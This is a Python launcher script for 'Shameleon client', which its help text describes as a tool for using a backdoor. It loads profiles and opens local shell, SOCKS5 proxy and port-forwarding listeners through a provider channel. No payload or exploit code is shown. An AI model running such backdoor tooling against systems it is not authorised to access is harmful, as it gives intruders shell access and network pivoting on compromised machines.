#!/bin/env python3
import argparse
import asyncio
import os

from shameleon_client.profile import Profile
from shameleon_client.providers.base import ShameleonProvider
from shameleon_client.server import LocalServer


async def main(profile_dir: str, profile_name: str):
    loop = asyncio.get_event_loop()

    # Load profiles
    profiles: dict[str, Profile] = {}
    for file_name in os.listdir(profile_dir):
        ext = file_name.split('.')[-1].lower()
        if ext not in ['yaml', 'yml']:
            continue
        profile_path = os.path.join(profile_dir, file_name)
        profile = Profile.load(profile_path)
        profiles[profile.name] = profile
    print(f'[i] {len(profiles)} profiles loaded.')
    chosen_profile = profiles.get(profile_name)
    if chosen_profile is None:
        print(f'[!] Profile {profile_name} not found.')
        exit(1)
    print(f"[*] Using profile {chosen_profile.name}")

    # Start provider
    provider = ShameleonProvider.get_module_from_name(chosen_profile.provider_name)(chosen_profile)
    loop.create_task(provider.run())

    # Shell
    # TODO: Config flag to activatiog
    if chosen_profile.shell_enabled:
        print(f"[*] Starting shell on port {chosen_profile.shell_port}")
        shell = LocalServer(chosen_profile.shell_port, 'sh', provider)
        loop.create_task(shell.run())
    if chosen_profile.socks_enabled:
        print(f"[*] Starting socks5 on port {chosen_profile.socks_port}")
        socks = LocalServer(chosen_profile.socks_port, 'sx', provider)
        loop.create_task(socks.run())
    if chosen_profile.lforward_enabled:
        for local_port, remote in chosen_profile.lforward.items():
            print(f"[*] Starting local forward on port {local_port} -> {remote['remote_host']}:{remote['remote_port']}")
            lforward = LocalServer(
                local_port,
                'lf',
                provider,
                remote_host=remote['remote_host'],
                remote_port=remote['remote_port'],
            )
            loop.create_task(lforward.run())

    while len(asyncio.all_tasks()) > 1:
        await asyncio.sleep(1)

    print('SO GOOD SO FAR')


if __name__ == '__main__':
    # ARGS PARSING
    parser = argparse.ArgumentParser("Shameleon client - v0.2")
    parser.add_argument(
        '-p',
        '--profile-dir',
        default='./profiles',
        help="Path to directory containing profiles",
    )
    parser.add_argument(
        'profile',
        type=str,
        help='Names of backdoor to use',
    )
    args = parser.parse_args()
    asyncio.run(main(args.profile_dir, args.profile))
